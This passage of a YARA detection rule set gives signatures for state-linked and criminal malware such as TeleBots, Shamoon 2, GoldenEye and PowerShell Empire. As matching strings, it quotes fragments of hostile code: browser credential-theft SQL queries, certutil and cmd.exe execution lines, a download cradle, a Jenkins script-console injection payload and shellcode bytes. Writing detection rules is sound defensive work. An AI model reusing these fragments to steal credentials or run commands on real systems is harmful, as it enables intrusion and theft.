https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"31d86f77137f0b3697af03dd28d6552258314cecd3c1d9dc18fcf609eb24229a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Invalid parameter received by implant\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_PassFreely_Lp_RID31DC : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PassFreely_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 13:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fe42139748c8e9ba27a812466d9395b3a0818b0cd7b41d6769cb7239e57219fb\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unexpected value in memory.  Run the 'CheckOracle' or 'memcheck' command to identify the problem\" fullword wide\n      $s2 = \"Oracle process memory successfully modified!\" fullword wide\n      $s3 = \"Unable to reset the memory protection mask to the memory\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_1_RID33A4 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:56:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"694be2698bcc5c7a1cce11f8ef65c1c96a883d14b98148c36b32888fb58b6a7e\"\n      hash2 = \"73d1d55493886639c619e9f5e312daab93e4feeb74f24dbe51593842baac8d15\"\n      hash3 = \"e1c9c9f031d902e69e42f684ae5b35a2513f7d5f8bca83dfbab10e8de6254c78\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Injection Lib -  GetProcAddress failed on Kernel32.DLL function\" fullword wide\n      $x2 = \"Injection Lib -  JUMPUP failed to open requested process\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or ( all of them )\n}\n\nrule Venom_Rootkit_RID2C61 : APT DEMO LINUX T1014 {\n   meta:\n      description = \"Venom Linux Rootkit\"\n      author = \"Florian Roth\"\n      reference = \"https://security.web.cern.ch/security/venom.shtml\"\n      date = \"2017-01-12 09:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, LINUX, T1014\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%%VENOM%CTRL%MODE%%\" ascii fullword\n      $s2 = \"%%VENOM%OK%OK%%\" ascii fullword\n      $s3 = \"%%VENOM%WIN%WN%%\" ascii fullword\n      $s4 = \"%%VENOM%AUTHENTICATE%%\" ascii fullword\n      $s5 = \". entering interactive shell\" ascii fullword\n      $s6 = \". processing ltun request\" ascii fullword\n      $s7 = \". processing rtun request\" ascii fullword\n      $s8 = \". processing get request\" ascii fullword\n      $s9 = \". processing put request\" ascii fullword\n      $s10 = \"venom by mouzone\" ascii fullword\n      $s11 = \"justCANTbeSTOPPED\" ascii fullword\n   condition: \n      filesize < 4000KB and 2 of them\n}\n\nrule GRIZZLY_STEPPE_Malware_1_RID2F34 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file HRDG022184_certclint.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity\"\n      date = \"2016-12-29 11:47:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"9f918fb741e951a10e68ce6874b839aef5a26d60486db31e509f8dcaa13acec5\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"S:\\\\Lidstone\\\\renewing\\\\HA\\\\disable\\\\In.pdb\" fullword ascii\n      $s2 = \"Repeat last find command)Replace specific text with different text\" fullword wide\n      $s3 = \"l\\\\Processor(0)\\\\% Processor Time\" fullword wide\n      $s6 = \"Self Process\" fullword wide\n      $s7 = \"Default Process\" fullword wide\n      $s8 = \"Star Polk.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )\n}\n\nrule GRIZZLY_STEPPE_Malware_2_RID2F35 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity\"\n      date = \"2016-12-29 11:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0\"\n      hash2 = \"55058d3427ce932d8efcbe54dccf97c9a8d1e85c767814e34f4b2b6a6b305641\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GoogleCrashReport.dll\" fullword ascii\n      $s1 = \"CrashErrors\" fullword ascii\n      $s2 = \"CrashSend\" fullword ascii\n      $s3 = \"CrashAddData\" fullword ascii\n      $s4 = \"CrashCleanup\" fullword ascii\n      $s5 = \"CrashInit\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )\n}\n\nrule TeleBots_IntercepterNG_RID2FAC : APT DEMO EXE FILE G0034 {\n   meta:\n      description = \"Detects TeleBots malware - IntercepterNG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 12:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5f9fef7974d37922ac91365588fbe7b544e13abbbde7c262fe30bade7026e118\"\n      tags = \"APT, DEMO, EXE, FILE, G0034\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: %s iface_num\\\\dump [mode] [w] [-gw] [-t1 ip]\" fullword ascii\n      $s2 = \"Target%d found: %s - [%.2X-%.2X-%.2X-%.2X-%.2X-%.2X]\" fullword ascii\n      $s3 = \"3: passwords + files, no arp poison\" fullword ascii\n      $s4 = \"IRC Joining Keyed Channel intercepted\" fullword ascii\n      $s5 = \"-tX - set target ip\" fullword ascii\n      $s6 = \"w - save session to .pcap dump\" fullword ascii\n      $s7 = \"example: %s 1 1 -gw 192.168.1.1 -t1 192.168.1.3 -t2 192.168.1.5\" fullword ascii\n      $s8 = \"ORACLE8 DES Authorization intercepted\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 4 of them )\n}\n\nrule TeleBots_KillDisk_1_RID2E39 : APT DEMO EXE FILE G0034 {\n   meta:\n      description = \"Detects TeleBots malware - KillDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 11:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"8246f709efa922a485e1ca32d8b0d10dc752618e8b3fce4d3dd58d10e4a6a16d\"\n      tags = \"APT, DEMO, EXE, FILE, G0034\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Plug-And-Play Support Service\" fullword wide\n      $s2 = \" /c \\\"echo Y|\" fullword wide\n      $s3 = \"-set=06.12.2016#09:30 -est=1410\" fullword ascii\n      $s4 = \"%d.%d.%d#%d:%d\" fullword ascii\n      $s5 = \" /T /C /G \" fullword wide\n      $s6 = \"[-] > %ls\" fullword wide\n      $s7 = \"[+] > %ls\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them ) or ( 6 of them )\n}\n\nrule TeleBots_KillDisk_2_RID2E3A : APT DEMO EXE FILE G0034 {\n   meta:\n      description = \"Detects TeleBots malware - KillDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 11:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"26173c9ec8fd1c4f9f18f89683b23267f6f9d116196ed15655e9cb453af2890e\"\n      tags = \"APT, DEMO, EXE, FILE, G0034\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Plug-And-Play Support Service\" fullword wide\n      $s2 = \" /c \\\"echo Y|\" fullword wide\n      $s3 = \"%d.%d.%d#%d:%d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}\n\nrule TeleBots_CredRaptor_Password_Stealer_RID3569 : APT DEMO EXE FILE G0034 T1003 {\n   meta:\n      description = \"Detects TeleBots malware - CredRaptor Password Stealer\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 16:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"50b990f6555055a265fde98324759dbc74619d6a7c49b9fd786775299bf77d26\"\n      tags = \"APT, DEMO, EXE, FILE, G0034, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\Desktop\\\\GetPAI\\\\Out\\\\IE.pdb\" fullword ascii\n      $s2 = \"SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins\" fullword ascii\n      $s3 = \"SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS\" fullword ascii\n      $s4 = \".\\\\PAI\\\\IEforXPpasswords.txt\" ascii\n      $s5 = \"\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" ascii\n      $s6 = \"Opera old version credentials\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them ) or ( 4 of them )\n}\n\nrule TeleBots_VBS_Backdoor_1_RID2F91 : APT DEMO FILE G0034 SCRIPT {\n   meta:\n      description = \"Detects TeleBots malware - VBS Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 12:02:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"eb31a918ccc1643d069cf08b7958e2760e8551ba3b88ea9e5d496e07437273b2\"\n      tags = \"APT, DEMO, FILE, G0034, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" >\\\" + outfile +\\\" 2>&1\\\"\" fullword ascii\n      $s2 = \"GetTemp = \\\"c:\\\\WINDOWS\\\\addins\\\"\" fullword ascii\n      $s3 = \"elseif (arg0 = \\\"-dump\\\") Then\" fullword ascii\n      $s4 = \"decode = \\\"certutil -decode \\\" + source + \\\" \\\" + dest  \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6553 and filesize < 8KB and 1 of them ) or ( all of them )\n}\n\nrule TeleBots_VBS_Backdoor_2_RID2F92 : APT DEMO FILE G0034 SCRIPT {\n   meta:\n      description = \"Detects TeleBots malware - VBS Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 12:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"1b2a5922b58c8060844b43e14dfa5b0c8b119f281f54a46f0f1c34accde71ddb\"\n      tags = \"APT, DEMO, FILE, G0034, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" \\\" + arg2\" fullword ascii\n      $s2 = \"Dim WMI:  Set WMI = GetObject(\\\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\\\")\" fullword ascii\n      $s3 = \"cmd = \\\"certutil -encode -f \\\" + source + \\\" \\\" + dest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6944 and filesize < 30KB and 1 of them ) or ( 2 of them )\n}\n\nrule TeleBots_Win64_Spy_KeyLogger_G_RID3253 : APT DEMO EXE FILE G0034 T1056_001 {\n   meta:\n      description = \"Detects TeleBots malware - Win64 Spy KeyLogger G\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/\"\n      date = \"2016-12-14 14:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e3f134ae88f05463c4707a80f956a689fba7066bb5357f6d45cba312ad0db68e\"\n      tags = \"APT, DEMO, EXE, FILE, G0034, T1056_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WRK\\\\GHook\\\\gHook\\\\x64\\\\Debug\\\\gHookx64.pdb\" fullword ascii\n      $s2 = \"Install hooks error!\" fullword wide\n      $s4 = \"%ls%d.~tmp\" fullword wide\n      $s5 = \"[*]Window PID > %d: \" fullword wide\n      $s6 = \"Install hooks ok!\" fullword wide\n      $s7 = \"[!]Clipboard paste\" fullword wide\n      $s9 = \"[*] IMAGE : %ls\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 3 of them )\n}\n\nrule GoldenEye_Ransomware_XLS_RID3061 : CRIME DEMO FILE MAL RANSOM T1203 T1566_001 {\n   meta:\n      description = \"GoldenEye XLS with Macro - file Schneider-Bewerbung.xls\"\n      author = \"Florian Roth\"\n      reference = \"https://www.heise.de/news/Aufgepasst-Neuer-Verschluesselungstrojaner-Goldeneye-verbreitet-sich-rasant-3561396.html\"\n      date = \"2016-12-06 12:37:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2320d4232ee80cc90bacd768ba52374a21d0773c39895b88cdcaa7782e16c441\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')\" fullword ascii\n      $x2 = \"var shell = new ActiveXObject('WScript.Shell');shell.run(t'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 1 of them )\n}\n\nrule GoldenEyeRansomware_Dropper_MalformedZoomit_RID385F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Dropped Executable - \"\n      author = \"Florian Roth\"\n      reference = \"https://www.heise.de/news/Aufgepasst-Neuer-Verschluesselungstrojaner-Goldeneye-verbreitet-sich-rasant-3561396.html\"\n      date = \"2016-12-06 18:18:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"b5ef16922e2c76b09edd71471dd837e89811c5e658406a8495c1364d0d9dc690\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ZoomIt - Sysinternals: www.sysinternals.com\" fullword ascii\n      $n1 = \"Mark Russinovich\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and $s1 and not $n1 )\n}\n\nrule Shamoon2_Wiper_RID2C7E : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects Shamoon 2.0 Wiper Component\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"\n      date = \"2016-12-01 09:51:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\"\n      hash2 = \"128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\??\\\\%s\\\\System32\\\\%s.exe\" fullword wide\n      $x1 = \"IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB\" wide\n      $s1 = \"UFWYNYNTS\" fullword wide\n      $s2 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )\n}\n\nrule Shamoon2_ComComp_RID2D25 : APT DEMO EXE FILE MIDDLE_EAST T1083 {\n   meta:\n      description = \"Detects Shamoon 2.0 Communication Components\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"\n      date = \"2016-12-01 10:19:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mkdir %s%s > nul 2>&1\" fullword ascii\n      $s2 = \"p[%s%s%d.%s\" fullword ascii\n      $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 } \n      $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d } \n      $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( all of ( $s* ) or all of ( $op* ) )\n}\n\nrule EldoS_RawDisk_RID2BFC : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"\n      date = \"2016-12-01 09:29:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\"\n      hash2 = \"394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"g\\\\system32\\\\\" wide\n      $s2 = \"ztvttw\" fullword wide\n      $s3 = \"lwizvm\" fullword ascii\n      $s4 = \"FEJIKC\" fullword ascii\n      $s5 = \"INZQND\" fullword ascii\n      $s6 = \"IUTLOM\" fullword wide\n      $s7 = \"DKFKCK\" fullword ascii\n      $op1 = { 94 35 77 73 03 40 eb e9 } \n      $op2 = { 80 7c 41 01 00 74 0a 3d } \n      $op3 = { 74 0a 3d 00 94 35 77 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them )\n}\n\nrule Empire_Invoke_MetasploitPayload_RID3389 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-MetasploitPayload.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a85ca27537ebeb79601b885b35ddff6431860b5852c6a664d32a321782808c54\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ProcessInfo.Arguments=\\\"-nop -c $DownloadCradle\\\"\" fullword ascii\n      $s2 = \"$PowershellExe=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 9KB and 1 of them ) or all of them\n}\n\nrule Empire_Exploit_Jenkins_RID2FE8 : DEMO EXPLOIT SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Exploit-Jenkins.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729\"\n      tags = \"DEMO, EXPLOIT, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$postdata=\\\"script=println+new+ProcessBuilder%28%27\\\"+$($Cmd)+\\\"\" ascii\n      $s2 = \"$url = \\\"http://\\\"+$($Rhost)+\\\":\\\"+$($Port)+\\\"/script\\\"\" fullword ascii\n      $s3 = \"$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6620 and filesize < 7KB and 1 of them ) or all of them\n}\n\nrule Empire_Get_SecurityPackages_RID31C8 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Get-SecurityPackages.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:37:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)\" fullword ascii\n      $s2 = \"$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_PowerDump_RID3040 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PowerDump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x16 = \"$enc = Get-PostHashdumpScript\" fullword ascii\n      $x19 = \"$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;\" fullword ascii\n      $x20 = \"$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2023 and filesize < 60KB and 1 of them ) or all of them\n}\n\nrule Empire_Install_SSP_RID2DFE : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Install-SSP.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7fd921a23950334257dda57b99e03c1e1594d736aab2dbfe9583f99cd9b1d165\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Install-SSP -Path .\\\\mimilib.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_ShellcodeMSIL_RID3165 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-ShellcodeMSIL.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$FinalShellcode.Length\" fullword ascii\n      $s2 = \"@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)\" fullword ascii\n      $s3 = \"@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,\" fullword ascii\n      $s4 = \"$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}\n\nrule HKTL_Empire_PowerUp_RID2E36 : DEMO HKTL SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"$PoolPasswordCmd = 'c:\\\\windows\\\\system32\\\\inetsrv\\\\appcmd.exe list apppool\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}\n\nrule Empire_Get_GPPPassword_RID2F8B : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Get-GPPPassword.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"55a4519c4f243148a971e4860225532a7ce730b3045bde3928303983ebcc38b0\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Base64Decoded = [Convert]::FromBase64String($Cpassword)\" fullword ascii\n      $s2 = \"$XMlFiles += Get-ChildItem -Path \\\"\\\\\\\\$DomainController\\\\SYSVOL\\\" -Recurse\" ascii\n      $s3 = \"function Get-DecryptedCpassword {\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_SmbScanner_RID3089 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SmbScanner.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = 